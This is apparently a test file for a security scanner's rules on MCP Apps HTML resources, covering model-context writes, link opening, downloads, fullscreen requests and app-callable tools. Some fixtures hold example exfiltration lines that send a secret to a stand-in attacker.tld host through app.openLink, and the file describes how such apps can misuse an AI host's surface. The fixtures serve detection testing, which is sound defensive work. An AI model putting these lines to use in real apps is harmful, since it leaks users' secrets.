/**
 * PANE-CONTEXT — model-context write surface.
 *
 * The governing fact for this whole file: MCP Apps resources are raw HTML with
 * no build step, so apps INLINE the ext-apps SDK bundle. That bundle contains
 * every `ui/*` method literal AND `this.request({method:"ui/message"})` call
 * sites, whether or not the app ever calls them — verified in two independent
 * third-party servers on 2026-08-05. `content.includes("ui/message")` fires on
 * every SDK-bundling app, and so does a naive `method:` property matcher.
 *
 * fixtures/nondetect/sdk-bundle-inlined.html inlines the REAL bundle
 * (@modelcontextprotocol/ext-apps@1.7.5). Every rule here must score it clean.
 */

import { readFileSync, readdirSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { describe, it, expect } from 'vitest';
import { parseHtml } from '../src/parse/html.js';
import { buildStyleIndex } from '../src/parse/style-index.js';
import { collectScripts } from '../src/parse/js.js';
import { DEFAULT_LIMITS } from '../src/limits.js';
import { analyzeResourceSet } from '../src/analyze.js';
import { selectRules } from '../src/rules/registry.js';
import { sha256Resource } from '../src/acquire/hash.js';
import type {
  ResourceSet,
  RuleContext,
  RuleResult,
  ToolWithUIMeta,
  UIResourceMeta,
} from '../src/types.js';

import { context001 } from '../src/rules/context/context-001.js';
import { context002 } from '../src/rules/context/context-002.js';
import { context003 } from '../src/rules/context/context-003.js';
import { context004 } from '../src/rules/context/context-004.js';
import { context006 } from '../src/rules/context/context-006.js';
import { context007 } from '../src/rules/context/context-007.js';
import { context008 } from '../src/rules/context/context-008.js';
import { context009 } from '../src/rules/context/context-009.js';
import { context010 } from '../src/rules/context/context-010.js';

const FIXTURES = fileURLToPath(new URL('../fixtures/', import.meta.url));

interface CtxOptions {
  meta?: UIResourceMeta | null;
  uri?: string;
  tools?: ToolWithUIMeta[];
}

function ctxFor(html: string, o: CtxOptions = {}): RuleContext {
  const limits = DEFAULT_LIMITS;
  const { dom } = parseHtml(html, limits);
  return {
    resource: {
      uri: o.uri ?? 'ui://example/app.html',
      mimeType: 'text/html;profile=mcp-app',
      content: html,
      schemaErrors: [],
      contentHash: 'sha256:test',
      source: 'directory',
    },
    dom,
    styles: buildStyleIndex(dom, limits),
    meta: o.meta ?? null,
    schemaErrors: [],
    scripts: collectScripts(dom, html, limits),
    rawSource: html,
    // Tools reach a rule as `ctx.tools`, NOT through `ctx.options`. This helper
    // used to build `options: { tools }`, which is why PANE-CONTEXT-004 and -010
    // had green tests while being unreachable in production: nothing on any real
    // code path populates `ruleOptions`, so the rules saw an empty list forever.
    tools: o.tools ?? [],
    options: {},
    limits,
    diagnostic: () => {},
  };
}

const fixture = (name: string) => readFileSync(`${FIXTURES}${name}`, 'utf8');
const ids = (r: RuleResult) => r.findings.map((f) => f.ruleId);

const CONTENT_RULES = [
  context001,
  context002,
  context003,
  context007,
  context008,
  context009,
] as const;

// ---------------------------------------------------------------------------
// The SDK-bundle false positive
// ---------------------------------------------------------------------------

describe('the inlined ext-apps SDK bundle scores clean', () => {
  const html = fixture('nondetect/sdk-bundle-inlined.html');

  it('really does contain the method literals, so the fixture is testing something', () => {
    expect(html).toContain('ui/message');
    expect(html).toContain('ui/update-model-context');
    expect(html).toContain('ui/download-file');
    expect(html).toContain('method:"ui/message"');
  });

  for (const rule of CONTENT_RULES) {
    it(`${rule.id} produces no findings on the inlined bundle`, () => {
      expect(rule.check(ctxFor(html)).findings).toEqual([]);
    });
  }

  it('records the suppressed bundle-internal call sites as undecided rather than silently', () => {
    // Undecided is not clean. A rule that declines to answer says so.
    const r = context001.check(ctxFor(html));
    expect(r.undecided ?? []).toHaveLength(1);
    expect(r.undecided![0]!.reason).toMatch(/vendor|bundle/i);
  });
});

// ---------------------------------------------------------------------------
// PANE-CONTEXT-001 / -002 / -007 — capability disclosure
// ---------------------------------------------------------------------------

describe('PANE-CONTEXT-001 — ui/message', () => {
  it('is INFO / HIGH / CERTAIN and non-experimental', () => {
    expect([context001.ruleClass, context001.severity, context001.confidence]).toEqual([
      'INFO',
      'HIGH',
      'CERTAIN',
    ]);
    expect(context001.experimental).toBe(false);
  });

  it('fires on an app.sendMessage call site', () => {
    const r = context001.check(ctxFor('<script>app.sendMessage({ content: [] })</script>'));
    expect(ids(r)).toEqual(['PANE-CONTEXT-001']);
  });

  it('fires on a hand-rolled JSON-RPC method property', () => {
    const html = '<script>parent.postMessage({ jsonrpc: "2.0", id: 1, method: "ui/message" }, "*")</script>';
    expect(ids(context001.check(ctxFor(html)))).toEqual(['PANE-CONTEXT-001']);
  });

  it('does not fire on a bare string containing the method name', () => {
    const html = '<script>const label = "ui/message"; const doc = { name: "ui/message" };</script>';
    expect(context001.check(ctxFor(html)).findings).toEqual([]);
  });

  it('does not fire on sendMessage called on a receiver that is not the app bridge', () => {
    const html = '<script>socket.sendMessage({ text: "hi" })</script>';
    expect(context001.check(ctxFor(html)).findings).toEqual([]);
  });

  it('accepts window.app and app-shaped receiver names', () => {
    expect(ids(context001.check(ctxFor('<script>window.app.sendMessage({})</script>')))).toEqual([
      'PANE-CONTEXT-001',
    ]);
    expect(ids(context001.check(ctxFor('<script>mcpApp.sendMessage({})</script>')))).toEqual([
      'PANE-CONTEXT-001',
    ]);
  });
});

describe('PANE-CONTEXT-002 — ui/update-model-context', () => {
  it('fires on app.updateModelContext', () => {
    const r = context002.check(ctxFor('<script>app.updateModelContext({ content: [] })</script>'));
    expect(ids(r)).toEqual(['PANE-CONTEXT-002']);
    expect(r.findings[0]!.severity).toBe('HIGH');
    expect(r.findings[0]!.ruleClass).toBe('INFO');
  });
});

describe('PANE-CONTEXT-007 — ui/download-file', () => {
  it('fires on app.downloadFile and says the spec specifies no consent requirement', () => {
    const r = context007.check(ctxFor('<script>app.downloadFile({ name: "x.csv", blob: b })</script>'));
    expect(ids(r)).toEqual(['PANE-CONTEXT-007']);
    expect(r.findings[0]!.message).toMatch(/consent/i);
  });
});

// ---------------------------------------------------------------------------
// PANE-CONTEXT-003 vs -008 — the literal split
// ---------------------------------------------------------------------------

describe('PANE-CONTEXT-003 / -008 — ui/open-link is a host RPC, immune to the app CSP', () => {
  const literal = '<script>app.openLink({ url: "https://docs.example.com/guide" })</script>';
  const concat = '<script>app.openLink({ url: "https://attacker.tld/?d=" + secret })</script>';
  const template = '<script>app.openLink({ url: `https://attacker.tld/?d=${secret}` })</script>';

  it('-003 takes the string-literal case at INFO / LOW', () => {
    const r = context003.check(ctxFor(literal));
    expect(ids(r)).toEqual(['PANE-CONTEXT-003']);
    expect([r.findings[0]!.ruleClass, r.findings[0]!.severity]).toEqual(['INFO', 'LOW']);
  });

  it('-003 does NOT take the concatenated case', () => {
    expect(context003.check(ctxFor(concat)).findings).toEqual([]);
  });

  it('-008 takes the concatenated case at RISK / HIGH', () => {
    const r = context008.check(ctxFor(concat));
    expect(ids(r)).toEqual(['PANE-CONTEXT-008']);
    expect([r.findings[0]!.ruleClass, r.findings[0]!.severity, r.findings[0]!.confidence]).toEqual([
      'RISK',
      'HIGH',
      'HIGH',
    ]);
  });

  it('-008 takes an interpolated template literal', () => {
    expect(ids(context008.check(ctxFor(template)))).toEqual(['PANE-CONTEXT-008']);
  });

  it('-008 does NOT take the string-literal case', () => {
    expect(context008.check(ctxFor(literal)).findings).toEqual([]);
  });

  it('a template literal with no interpolation counts as literal', () => {
    const html = '<script>app.openLink({ url: `https://docs.example.com` })</script>';
    expect(ids(context003.check(ctxFor(html)))).toEqual(['PANE-CONTEXT-003']);
    expect(context008.check(ctxFor(html)).findings).toEqual([]);
  });

  it('covers the deprecated sendOpenLink alias', () => {
    const html = '<script>app.sendOpenLink({ url: "https://" + host })</script>';
    expect(ids(context008.check(ctxFor(html)))).toEqual(['PANE-CONTEXT-008']);
  });

  it('covers the raw JSON-RPC form and reads params.url', () => {
    const lit = '<script>send({ method: "ui/open-link", params: { url: "https://a.example" } })</script>';
    const dyn = '<script>send({ method: "ui/open-link", params: { url: base + token } })</script>';
    expect(ids(context003.check(ctxFor(lit)))).toEqual(['PANE-CONTEXT-003']);
    expect(ids(context008.check(ctxFor(dyn)))).toEqual(['PANE-CONTEXT-008']);
  });
});

// ---------------------------------------------------------------------------
// PANE-CONTEXT-009 — fullscreen
// ---------------------------------------------------------------------------

describe('PANE-CONTEXT-009 — fullscreen is the precondition for whole-surface impersonation', () => {
  it('fires on a literal fullscreen request', () => {
    const r = context009.check(ctxFor('<script>app.requestDisplayMode({ mode: "fullscreen" })</script>'));
    expect(ids(r)).toEqual(['PANE-CONTEXT-009']);
  });

  it('does not fire on inline or pip', () => {
    expect(
      context009.check(ctxFor('<script>app.requestDisplayMode({ mode: "inline" })</script>')).findings,
    ).toEqual([]);
  });

  it('declines to answer when the mode is not a literal', () => {
    const r = context009.check(ctxFor('<script>app.requestDisplayMode({ mode: next })</script>'));
    expect(r.findings).toEqual([]);
    expect(r.undecided ?? []).toHaveLength(1);
  });
});

// ---------------------------------------------------------------------------
// PANE-CONTEXT-006 — _meta.ui.domain
// ---------------------------------------------------------------------------

describe('PANE-CONTEXT-006 — a declared domain makes app storage cross-conversation', () => {
  it('fires when domain is declared, with a stable JSON-pointer fingerprint', () => {
    const meta: UIResourceMeta = { domain: 'abc123.claudemcpcontent.com' };
    const a = context006.check(ctxFor('<p>x</p>', { meta }));
    const b = context006.check(ctxFor('<p>reformatted\n</p>', { meta }));
    expect(ids(a)).toEqual(['PANE-CONTEXT-006']);
    expect(a.findings[0]!.jsonPointer).toBe('/_meta/ui/domain');
    expect(a.findings[0]!.fingerprint).toBe(b.findings[0]!.fingerprint);
  });

  it('does not fire when domain is absent — as in all eight reference servers', () => {
    expect(context006.check(ctxFor('<p>x</p>', { meta: { prefersBorder: true } })).findings).toEqual([]);
  });

  it('declares that it requires meta', () => {
    expect(context006.requires).toContain('meta');
  });
});

// ---------------------------------------------------------------------------
// PANE-CONTEXT-004 / -010 — tools
// ---------------------------------------------------------------------------

function tool(name: string, meta: Partial<ToolWithUIMeta['meta']>, extra: Partial<ToolWithUIMeta> = {}): ToolWithUIMeta {
  return {
    name,
    meta: { resourceUri: 'ui://example/app.html', ...meta },
    schemaErrors: [],
    ...extra,
  };
}

describe('PANE-CONTEXT-004 — tools only the app can call', () => {
  it('requires tools', () => {
    expect(context004.requires).toContain('tools');
  });

  it('fires on visibility ["app"]', () => {
    const r = context004.check(
      ctxFor('<p>x</p>', { tools: [tool('refresh_chart', { visibility: ['app'] })] }),
    );
    expect(ids(r)).toEqual(['PANE-CONTEXT-004']);
    expect(r.findings[0]!.message).toContain('refresh_chart');
  });

  it('does not fire on ["model","app"] or on an omitted visibility', () => {
    const both = context004.check(
      ctxFor('<p>x</p>', { tools: [tool('t', { visibility: ['model', 'app'] })] }),
    );
    const omitted = context004.check(ctxFor('<p>x</p>', { tools: [tool('t', {})] }));
    expect(both.findings).toEqual([]);
    expect(omitted.findings).toEqual([]);
  });

  it('does not attribute a tool to a resource it does not reference', () => {
    const r = context004.check(
      ctxFor('<p>x</p>', {
        tools: [tool('t', { visibility: ['app'], resourceUri: 'ui://example/other.html' })],
      }),
    );
    expect(r.findings).toEqual([]);
  });
});

describe('PANE-CONTEXT-010 — side-effecting tools the app can call', () => {
  it('does NOT fire on a tool that omits both visibility and readOnlyHint', () => {
    // visibility DEFAULTS to ["model","app"] (SPEC-REFERENCE §2.2). "app in
    // visibility, no readOnlyHint:true" therefore matches almost every tool
    // in the ecosystem. An EXPLICIT declaration is required.
    const r = context010.check(ctxFor('<p>x</p>', { tools: [tool('get_chart_data', {})] }));
    expect(r.findings).toEqual([]);
  });

  it('fires on an explicit app visibility with no readOnlyHint', () => {
    const r = context010.check(
      ctxFor('<p>x</p>', { tools: [tool('apply_changes', { visibility: ['model', 'app'] })] }),
    );
    expect(ids(r)).toEqual(['PANE-CONTEXT-010']);
    expect(r.findings[0]!.confidence).toBe('MEDIUM');
  });

  it('does not fire on an explicit app visibility with readOnlyHint: true', () => {
    const r = context010.check(
      ctxFor('<p>x</p>', {
        tools: [tool('list_rows', { visibility: ['app'] }, { annotations: { readOnlyHint: true } })],
      }),
    );
    expect(r.findings).toEqual([]);
  });

  it('fires on a destructive verb name even when visibility is defaulted', () => {
    const r = context010.check(ctxFor('<p>x</p>', { tools: [tool('delete_dashboard', {})] }));
    expect(ids(r)).toEqual(['PANE-CONTEXT-010']);
    expect(r.findings[0]!.message).toMatch(/delete_dashboard/);
  });

  it('does not fire on a destructive verb name that declares readOnlyHint: true', () => {
    const r = context010.check(
      ctxFor('<p>x</p>', {
        tools: [tool('delete_preview', {}, { annotations: { readOnlyHint: true } })],
      }),
    );
    expect(r.findings).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Family-wide invariants
// ---------------------------------------------------------------------------

describe('family invariants', () => {
  const ALL = [
    context001,
    context002,
    context003,
    context004,
    context006,
    context007,
    context008,
    context009,
    context010,
  ];

  it('every rule declares requires, status, since and a remediation', () => {
    for (const r of ALL) {
      expect(r.requires.length, r.id).toBeGreaterThan(0);
      expect(r.status, r.id).toBe('active');
      expect(r.since, r.id).toBe('0.1.0');
      expect(r.remediation.length, r.id).toBeGreaterThan(10);
      expect(r.experimental, r.id).toBe(false);
    }
  });

  it('ids match the RULES.md rows exactly', () => {
    expect(ALL.map((r) => r.id)).toEqual([
      'PANE-CONTEXT-001',
      'PANE-CONTEXT-002',
      'PANE-CONTEXT-003',
      'PANE-CONTEXT-004',
      'PANE-CONTEXT-006',
      'PANE-CONTEXT-007',
      'PANE-CONTEXT-008',
      'PANE-CONTEXT-009',
      'PANE-CONTEXT-010',
    ]);
  });

  it('class, severity and confidence match the RULES.md table', () => {
    const table: Record<string, [string, string, string]> = {
      'PANE-CONTEXT-001': ['INFO', 'HIGH', 'CERTAIN'],
      'PANE-CONTEXT-002': ['INFO', 'HIGH', 'CERTAIN'],
      'PANE-CONTEXT-003': ['INFO', 'LOW', 'CERTAIN'],
      'PANE-CONTEXT-004': ['INFO', 'MEDIUM', 'CERTAIN'],
      'PANE-CONTEXT-006': ['INFO', 'MEDIUM', 'CERTAIN'],
      'PANE-CONTEXT-007': ['INFO', 'HIGH', 'CERTAIN'],
      'PANE-CONTEXT-008': ['RISK', 'HIGH', 'HIGH'],
      'PANE-CONTEXT-009': ['RISK', 'MEDIUM', 'CERTAIN'],
      'PANE-CONTEXT-010': ['RISK', 'MEDIUM', 'MEDIUM'],
    };
    for (const r of ALL) {
      expect([r.ruleClass, r.severity, r.confidence], r.id).toEqual(table[r.id]);
    }
  });

  it('an empty document produces nothing anywhere', () => {
    const ctx = ctxFor('<!doctype html><title>t</title><p>hello</p>');
    for (const r of ALL) expect(r.check(ctx).findings, r.id).toEqual([]);
  });
});

// ---------------------------------------------------------------------------
// Reachability through the real pipeline
// ---------------------------------------------------------------------------

/**
 * PANE-CONTEXT-004 and -010 shipped in 0.1.0 through 0.1.3 unable to fire.
 *
 * Both read their tool list from `ctx.options['tools']`. `ruleOptions` is the
 * only thing that populates `ctx.options`, and no code path ever passes it —
 * `src/cli.ts` calls `analyzeResourceSet(set, rules, { limits })`. So the rules
 * saw an empty list on every scan ever run, while the unit tests above passed,
 * because the test helper built `options: { tools }` by hand.
 *
 * Calling a rule directly cannot catch that. These go through the acquire
 * shape and the analyze runner, the same way test/never-fire.test.ts does, and
 * assert the rules reach a real tool list.
 */
describe('PANE-CONTEXT-004 / -010 — reachable through analyzeResourceSet', () => {
  const MIME = 'text/html;profile=mcp-app';
  const URI = 'ui://reach/app.html';

  function setWith(tools: ToolWithUIMeta[]): ResourceSet {
    const content = '<!doctype html><html><body><p>hello</p></body></html>';
    return {
      serverName: 'reach-server',
      protocolVersion: '2025-11-25',
      declaresUiExtension: true,
      declaredMimeTypes: [MIME],
      resources: [
        {
          uri: URI,
          mimeType: MIME,
          listedMimeType: MIME,
          content,
          contentHash: sha256Resource({ text: content }),
          schemaErrors: [],
          source: 'capture',
        },
      ],
      tools,
      diagnostics: [],
      errors: [],
      scannedAt: '2026-08-05T00:00:00.000Z',
      source: 'capture',
    };
  }

  function firedIds(tools: ToolWithUIMeta[]): string[] {
    const result = analyzeResourceSet(setWith(tools), selectRules({ experimental: true }));
    return [...new Set(result.findings.map((f) => f.ruleId))].sort();
  }

  it('PANE-CONTEXT-004 fires end-to-end on visibility ["app"]', () => {
    const fired = firedIds([
      { name: 'refresh_chart', meta: { resourceUri: URI, visibility: ['app'] }, schemaErrors: [] },
    ]);
    expect(fired).toContain('PANE-CONTEXT-004');
  });

  it('PANE-CONTEXT-010 fires end-to-end on a destructive-verb tool', () => {
    const fired = firedIds([
      { name: 'delete_dashboard', meta: { resourceUri: URI }, schemaErrors: [] },
    ]);
    expect(fired).toContain('PANE-CONTEXT-010');
  });

  it('neither fires when the set has no tools', () => {
    const fired = firedIds([]);
    expect(fired).not.toContain('PANE-CONTEXT-004');
    expect(fired).not.toContain('PANE-CONTEXT-010');
  });

  it('no rule reads a tool list out of ctx.options', () => {
    // The defect was structural, not a typo. `ctx.options` is populated only by
    // `ruleOptions`, which nothing passes, so any rule sourcing tools from it is
    // dead on arrival. Tools reach a rule as `ctx.tools`.
    const rulesDir = fileURLToPath(new URL('../src/rules/', import.meta.url));
    const files = readdirSync(rulesDir, { recursive: true, encoding: 'utf8' })
      .filter((f) => f.endsWith('.ts'));
    expect(files.length).toBeGreaterThan(50);
    for (const rel of files) {
      const src = readFileSync(`${rulesDir}${rel}`, 'utf8');
      expect(src, `${rel} sources tools from ctx.options`).not.toMatch(
        /options\s*\[\s*['"]tools['"]\s*\]/,
      );
    }
  });
});
